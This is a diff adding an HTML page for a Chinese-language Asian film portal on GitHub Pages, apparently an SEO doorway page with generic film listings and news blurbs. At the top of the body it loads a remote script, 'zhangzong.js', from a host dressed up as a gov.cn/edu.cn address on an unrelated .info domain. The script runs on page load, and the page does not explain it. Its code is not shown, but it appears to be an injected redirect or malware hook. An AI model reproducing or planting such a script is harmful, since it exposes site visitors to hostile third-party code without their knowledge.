@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>亚洲电影网｜聚合亚洲新片热映与经典佳作的在线观影导航</title>
+<meta name="keywords" content="亚洲电影网, yazhourenchengdianyingwang-zh, 亚洲电影, 华语电影, 日韩电影, 在线观影, 电影资讯, 影片推荐, 新片预告, 经典老片">
+<meta name="description" content="亚洲电影网（yazhourenchengdianyingwang-zh）专注汇聚亚洲各国电影资源与资讯，覆盖华语、日韩、东南亚新片热映、经典佳作、导演专题与观影指南，为影迷提供一站式的亚洲电影发现入口。">
+<meta name="robots" content="index,follow">
+<meta name="author" content="亚洲电影网">
+<meta name="renderer" content="webkit">
+<meta property="og:type" content="website">
+<meta property="og:title" content="亚洲电影网 - 发现亚洲光影之美">
+<meta property="og:description" content="聚焦亚洲电影的在线导航与资讯平台，涵盖华语、日韩、东南亚新片热映与经典佳作推荐。">
+<meta property="og:url" content="https://yazhourenchengdianyingwang-zh.github.io">
+<link rel="canonical" href="https://yazhourenchengdianyingwang-zh.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#15131c; --paper:#f5f1e8; --accent:#e63946; --accent2:#ffb703;
+  --card:#1d1a26; --muted:#9b96a8; --line:rgba(255,255,255,.12);
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:var(--ink);color:var(--paper);line-height:1.75;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+
+/* ===== Top bar ===== */
+.topbar{
+  position:sticky;top:0;z-index:99;background:rgba(21,19,28,.92);
+  backdrop-filter:blur(10px);border-bottom:1px solid var(--line);
+}
+.topbar .wrap{display:flex;align-items:center;justify-content:space-between;height:64px}
+.brand{display:flex;align-items:baseline;gap:10px}
+.brand b{font-size:22px;font-weight:800;letter-spacing:1px;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.brand span{font-size:12px;color:var(--muted)}
+.nav{display:flex;gap:6px}
+.nav a{
+  padding:8px 14px;border-radius:22px;font-size:15px;color:#ddd;transition:.25s;
+}
+.nav a:hover{background:var(--accent);color:#fff}
+.menu-btn{display:none;background:none;border:0;color:#fff;font-size:26px;cursor:pointer}
+
+/* ===== Hero ===== */
+.hero{
+  position:relative;padding:90px 0 70px;text-align:center;
+  background:
+    radial-gradient(800px 400px at 20% 10%,rgba(230,57,70,.28),transparent 60%),
+    radial-gradient(700px 380px at 85% 20%,rgba(255,183,3,.16),transparent 60%),
+    linear-gradient(180deg,#15131c,#1c1926);
+}
+.hero .tag{
+  display:inline-block;font-size:13px;letter-spacing:3px;color:var(--accent2);
+  border:1px solid rgba(255,183,3,.4);padding:5px 18px;border-radius:30px;margin-bottom:24px;
+}
+.hero h1{font-size:46px;font-weight:900;line-height:1.25;margin-bottom:18px}
+.hero h1 em{font-style:normal;color:var(--accent)}
+.hero p{font-size:17px;color:#c9c4d3;max-width:680px;margin:0 auto 30px}
+.hero .acts{display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;padding:13px 30px;border-radius:30px;
+  font-size:16px;font-weight:600;transition:.25s;border:1px solid transparent;cursor:pointer;
+}
+.btn-main{background:var(--accent);color:#fff}
+.btn-main:hover{background:#ff5260;transform:translateY(-2px)}
+.btn-ghost{background:transparent;border-color:var(--line);color:#fff}
+.btn-ghost:hover{border-color:var(--accent2);color:var(--accent2)}
+.hero .site{margin-top:34px;font-size:14px;color:var(--muted)}
+.hero .site code{color:var(--accent2);font-family:Consolas,monospace}
+
+/* ===== Section ===== */
+section{padding:70px 0}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;margin-bottom:36px;flex-wrap:wrap}
+.sec-head h2{font-size:30px;font-weight:800;letter-spacing:.5px}
+.sec-head h2 i{font-style:normal;color:var(--accent)}
+.sec-head small{color:var(--muted);font-size:14px;max-width:420px;text-align:right}
+
+/* ===== Channel: posters ===== */
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:22px}
+.poster{
+  background:var(--card);border-radius:16px;overflow:hidden;border:1px solid var(--line);
+  transition:.3s;position:relative;
+}
+.poster:hover{transform:translateY(-6px);border-color:var(--accent)}
+.poster .ph{
+  height:240px;position:relative;display:flex;align-items:flex-end;padding:16px;
+}
+.poster .ph::after{
+  content:"";position:absolute;inset:0;
+  background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.85));
+}
+.poster .ph b{position:relative;z-index:2;font-size:20px}
+.poster .info{padding:16px}
+.poster .info p{font-size:13px;color:var(--muted);margin-bottom:10px;min-height:44px}
+.poster .info .meta{display:flex;justify-content:space-between;font-size:12px;color:#bbb}
+.poster .info .meta strong{color:var(--accent2)}
+.g1{background:linear-gradient(135deg,#6a0572,#ab0e43)}
+.g2{background:linear-gradient(135deg,#003566,#ffb703)}
+.g3{background:linear-gradient(135deg,#1b4332,#52b788)}
+.g4{background:linear-gradient(135deg,#370617,#d00000)}
+.g5{background:linear-gradient(135deg,#03045e,#0077b6)}
+.g6{background:linear-gradient(135deg,#3a0ca3,#f72585)}
+.g7{background:linear-gradient(135deg,#6d2323,#e07a5f)}
+.g8{background:linear-gradient(135deg,#283618,#bc6c25)}
+
+/* ===== Channel: genres ===== */
+.genres{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.genre{
+  background:var(--card);border-radius:14px;padding:26px;border:1px solid var(--line);
+  transition:.25s;
+}
+.genre:hover{border-color:var(--accent2);background:#23202e}
+.genre .no{font-size:13px;color:var(--accent);font-weight:700;letter-spacing:2px}
+.genre h3{font-size:20px;margin:8px 0 10px}
+.genre p{font-size:14px;color:var(--muted)}
+
+/* ===== Channel: about ===== */
+.about{background:linear-gradient(135deg,#1c1926,#211c2e);border-radius:24px;padding:50px;display:grid;grid-template-columns:1.1fr .9fr;gap:44px;align-items:center;border:1px solid var(--line)}
+.about h2{font-size:28px;margin-bottom:18px}
+.about p{color:#c9c4d3;margin-bottom:14px}
+.stats{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+.stat{background:rgba(255,255,255,.05);border-radius:14px;padding:22px;text-align:center;border:1px solid var(--line)}
+.stat b{display:block;font-size:34px;font-weight:900;color:var(--accent2)}
+.stat span{font-size:13px;color:var(--muted)}
+
+/* ===== Channel: news ===== */
+.news{display:grid;grid-template-columns:1.4fr 1fr;gap:24px}
+.news .lead{
+  background:var(--card);border-radius:16px;overflow:hidden;border:1px solid var(--line);
+  display:flex;flex-direction:column;
+}
+.news .lead .pic{height:280px;background:linear-gradient(135deg,#7209b7,#4361ee)}
+.news .lead .txt{padding:26px}
+.news .lead .txt .date{font-size:12px;color:var(--accent);letter-spacing:1px}
+.news .lead .txt h3{font-size:24px;margin:10px 0 12px}
+.news .lead .txt p{color:var(--muted);font-size:14px}
+.list{display:flex;flex-direction:column;gap:14px}
+.list a{
+  display:flex;gap:16px;background:var(--card);border-radius:14px;padding:16px;
+  border:1px solid var(--line);transition:.25s;align-items:center;
+}
+.list a:hover{border-color:var(--accent)}
+.list a .d{
+  flex:0 0 56px;height:56px;border-radius:10px;background:linear-gradient(135deg,var(--accent),var(--accent2));
+  display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:11px;line-height:1.3
+}
+.list a .d b{font-size:20px}
+.list a .t strong{display:block;font-size:15px;margin-bottom:4px}
+.list a .t span{font-size:12px;color:var(--muted)}
+
+/* ===== Footer ===== */
+footer{border-top:1px solid var(--line);padding:50px 0 30px;background:#11101a}
+.foot{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:30px;margin-bottom:34px}
+.foot h4{font-size:16px;margin-bottom:14px;color:var(--accent2)}
+.foot p,.foot li{font-size:13px;color:var(--muted);list-style:none}
+.foot ul li{padding:5px 0}
+.foot ul li a:hover{color:var(--accent)}
+.copyright{text-align:center;font-size:12px;color:#6f6a7c;border-top:1px solid var(--line);padding-top:22px}
+.copyright a{color:var(--accent2)}
+.hl{color:var(--accent)}
+
+/* ===== Responsive ===== */
+@media(max-width:960px){
+  .grid{grid-template-columns:repeat(2,1fr)}
+  .genres,.stats{grid-template-columns:repeat(2,1fr)}
+  .about,.news{grid-template-columns:1fr}
+  .about{padding:30px}
+  .hero h1{font-size:34px}
+  .foot{grid-template-columns:1fr 1fr}
+}
+@media(max-width:640px){
+  .wrap{padding:0 16px}
+  .menu-btn{display:block}
+  .nav{
+    position:fixed;top:64px;left:0;right:0;flex-direction:column;background:#15131c;
+    padding:16px;border-bottom:1px solid var(--line);transform:translateY(-150%);transition:.3s;
+  }
+  .nav.open{transform:translateY(0)}
+  .hero{padding:60px 0 50px}
+  .hero h1{font-size:28px}
+  .hero p{font-size:15px}
+  section{padding:50px 0}
+  .sec-head h2{font-size:24px}
+  .grid,.genres,.stats,.foot{grid-template-columns:1fr}
+  .about{padding:24px}
+  .news .lead .pic{height:200px}
+  .list a{flex-direction:column;align-items:flex-start}
+  .list a .d{flex-direction:row;gap:6px;height:auto;padding:4px 12px;border-radius:20px}
+  .list a .d b{font-size:16px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand">
+      <b>亚洲电影网</b>
+      <span>yazhourenchengdianyingwang-zh</span>
+    </div>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#showing">正在热映</a>
+      <a href="#genres">类型片单</a>
+      <a href="#about">关于本站</a>
+      <a href="#news">影讯动态</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<section class="hero" id="home">
+  <div class="wrap">
+    <span class="tag">ASIA CINEMA HUB</span>
+    <h1>聚焦<em>亚洲电影</em><br>发现光影里的万千世界</h1>
+    <p>亚洲电影网（yazhourenchengdianyingwang-zh）是一个面向影迷的亚洲影视聚合导航与资讯平台，覆盖华语、日韩、东南亚新片热映、经典佳作与导演专题。</p>
+    <div class="acts">
+      <a class="btn btn-main" href="#showing">查看热映片单 →</a>
+      <a class="btn btn-ghost" href="#genres">浏览类型专题</a>
+    </div>
+    <div class="site">访问官网：<code>https://yazhourenchengdianyingwang-zh.github.io</code></div>
+  </div>
+</section>
+
+<section id="showing">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2><i>01.</i> 正在<em>热映</em></h2>
+      <small>精选近期亚洲院线与流媒体平台的高分新作，持续更新。</small>
+    </div>
+    <div class="grid">
+      <article class="poster">
+        <div class="ph g1"><b>山河回响</b></div>
+        <div class="info">
+          <p>一部以边境小镇为背景的华语现实题材力作，讲述三代人在时代变迁中的坚守与抉择。</p>
+          <div class="meta"><span>华语 / 剧情</span><strong>8.7</strong></div>
+        </div>
+      </article>
+      <article class="poster">
+        <div class="ph g2"><b>东京夜雨</b></div>
+        <div class="info">
+          <p>日本导演滨口龙介新作，以一场绵长的雨串联都市男女错过的爱与重逢。</p>
+          <div class="meta"><span>日本 / 爱情</span><strong>8.4</strong></div>
+        </div>
+      </article>
+      <article class="poster">
+        <div class="ph g3"><b>海风来信</b></div>
+        <div class="info">
+          <p>韩国独立电影黑马，用克制镜头记录渔村少年离家前的最后一个夏天。</p>
+          <div class="meta"><span>韩国 / 成长</span><strong>8.9</strong></div>
+        </div>
+      </article>
+      <article class="poster">
+        <div class="ph g4"><b>湄公河之南</b></div>
+        <div class="info">
+          <p>越南新锐导演的公路片，一段跨越湄公河流域的音乐与寻根之旅。</p>
+          <div class="meta"><span>越南 / 公路</span><strong>8.1</strong></div>
+        </div>
+      </article>
+      <article class="poster">
+        <div class="ph g5"><b>雾港谜案</b></div>
+        <div class="info">
+          <p>港式悬疑新尝试，老练警探与天才罪犯在迷雾港口展开心理博弈。</p>
+          <div class="meta"><span>华语 / 悬疑</span><strong>8.3</strong></div>
+        </div>
+      </article>
+      <article class="poster">
+        <div class="ph g6"><b>大阪花火</b></div>
+        <div class="info">
+          <p>日本青春群像，四名高中女生在夏季祭典前的友情、暗恋与告别。</p>
+          <div class="meta"><span>日本 / 青春</span><strong>7.9</strong></div>
+        </div>
+      </article>
+      <article class="poster">
+        <div class="ph g7"><b>香料王国</b></div>
+        <div class="info">
+          <p>印度家庭史诗，围绕一家香料商的遗产之争，拍出浓郁色彩与烟火气。</p>
+          <div class="meta"><span>印度 / 家庭</span><strong>8.2</strong></div>
+        </div>
+      </article>
+      <article class="poster">
+        <div class="ph g8"><b>蝉鸣森林</b></div>
+        <div class="info">
+          <p>泰国艺术电影，用极简叙事与自然声景描绘一位护林人的孤独日常。</p>
+          <div class="meta"><span>泰国 / 艺术</span><strong>8.0</strong></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section id="genres" style="background:#191620">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2><i>02.</i> 类型<em>片单</em></h2>
+      <small>按题材与风格归类，帮你快速找到此刻想看的亚洲电影。</small>
+    </div>
+    <div class="genres">
+      <div class="genre">
+        <div class="no">GENRE 01</div>
+        <h3>华语剧情</h3>
+        <p>聚焦两岸三地现实题材，记录市井人生与时代脉动，贴近生活本真。</p>
+      </div>
+      <div class="genre">
+        <div class="no">GENRE 02</div>
+        <h3>日式治愈</h3>
+        <p>从四季物语到美食随笔，用细腻镜头抚慰都市疲惫，温柔而克制。</p>
+      </div>
+      <div class="genre">
+        <div class="no">GENRE 03</div>
+        <h3>韩式悬疑</h3>
+        <p>犯罪与心理博弈的高能碰撞，反转不断，节奏紧凑令人屏息。</p>
+      </div>
+      <div class="genre">
+        <div class="no">GENRE 04</div>
+        <h3>东南亚艺术</h3>
+        <p>慢电影与作者表达的代表，沉浸于热带光影与独特文化氛围中。</p>
+      </div>
+      <div class="genre">
+        <div class="no">GENRE 05</div>
+        <h3>动作武侠</h3>
+        <p>从港片枪火到东方武侠，重燃热血，感受动作设计的极致美学。</p>
+      </div>
+      <div class="genre">
+        <div class="no">GENRE 06</div>
+        <h3>经典回顾</h3>
+        <p>重温亚洲影史里程碑，黑泽明、侯孝贤、阿巴斯等大师佳作。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap">
+    <div class="about">
+      <div>
+        <h2>关于<span class="hl">亚洲电影网</span></h2>
+        <p>亚洲电影网（yazhourenchengdianyingwang-zh）致力于成为中文影迷探索亚洲电影的首选入口。我们关注从主流商业巨制到小众艺术佳片，覆盖中国、日本、韩国、印度、泰国、越南等亚洲国家与地区。</p>
+        <p>本站内容以影片介绍、类型片单、影讯动态与观影指南为主，帮助你在浩如烟海的影视信息中，快速发现值得一看的好电影。</p>
+        <a class="btn btn-main" href="#news" style="margin-top:10px">了解更多影讯 →</a>
+      </div>
+      <div class="stats">
+        <div class="stat"><b>50+</b><span>覆盖国家地区</span></div>
+        <div class="stat"><b>2000+</b><span>收录影片条目</span></div>
+        <div class="stat"><b>12</b><span>类型专题片单</span></div>
+        <div class="stat"><b>每日</b><span>更新影讯动态</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="news" style="background:#191620">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2><i>03.</i> 影讯<em>动态</em></h2>
+      <small>电影节、颁奖季与行业新动向，第一时间掌握。</small>
+    </div>
+    <div class="news">
+      <article class="lead">
+        <div class="pic"></div>
+        <div class="txt">
+          <div class="date">2026 · 釜山国际电影节</div>
+          <h3>亚洲新导演奖揭晓，三部华语短片入围</h3>
+          <p>本届釜山国际电影节亚洲新导演竞赛单元揭晓入围名单，三部来自中国大陆与台湾地区的短片成功入围，展现新一代华语创作者的多元视野与叙事勇气。</p>
+        </div>
+      </article>
+      <div class="list">
+        <a href="#">
+          <div class="d"><b>10</b>月 · 影展</div>
+          <div class="t"><strong>东京电影节公布主视觉海报</strong><span>年度主竞赛片单预计下月揭晓。</span></div>
+        </a>
+        <a href="#">
+          <div class="d"><b>09</b>月 · 新片</div>
+          <div class="t"><strong>多部日韩新片确认引进</strong><span>影迷期待已久的作品将登陆大银幕。</span></div>
+        </a>
+        <a href="#">
+          <div class="d"><b>09</b>月 · 专题</div>
+          <div class="t"><strong>东南亚独立电影专题上线</strong><span>精选十五部小众佳作，感受别样东方美学。</span></div>
+        </a>
+        <a href="#">
+          <div class="d"><b>08</b>月 · 盘点</div>
+          <div class="t"><strong>暑期档华语电影票房盘点</strong><span>现实题材持续领跑，类型片百花齐放。</span></div>
+        </a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <h4>亚洲电影网</h4>
+        <p>专注亚洲电影资讯与片单推荐的中文影迷平台，发现亚洲光影之美。</p>
+        <p style="margin-top:12px">官网：<a href="https://yazhourenchengdianyingwang-zh.github.io">yazhourenchengdianyingwang-zh.github.io</a></p>
+      </div>
+      <div>
+        <h4>浏览导航</h4>
+        <ul>
+          <li><a href="#home">首页</a></li>
+          <li><a href="#showing">正在热映</a></li>
+          <li><a href="#genres">类型片单</a></li>
+          <li><a href="#about">关于本站</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>类型分类</h4>
+        <ul>
+          <li><a href="#">华语剧情</a></li>
+          <li><a href="#">日式治愈</a></li>
+          <li><a href="#">韩式悬疑</a></li>
+          <li><a href="#">东南亚艺术</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>相关链接</h4>
+        <ul>
+          <li><a href="#">影展资讯</a></li>
+          <li><a href="#">观影指南</a></li>
+          <li><a href="#">导演专题</a></li>
+          <li><a href="#">经典回顾</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copyright">
+      © 2026 <a href="https://yazhourenchengdianyingwang-zh.github.io">亚洲电影网 yazhourenchengdianyingwang-zh</a> · 专注亚洲电影发现与推荐 · 本站内容仅供资讯导航参考
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var btn=document.getElementById('menuBtn'),nav=document.getElementById('nav');
+  if(btn){
+    btn.addEventListener('click',function(){nav.classList.toggle('open');});
+    var links=nav.getElementsByTagName('a');
+    for(var i=0;i<links.length;i++){
+      links[i].addEventListener('click',function(){nav.classList.remove('open');});
+    }
+  }
+})();
+</script>
+</body>
+</html>
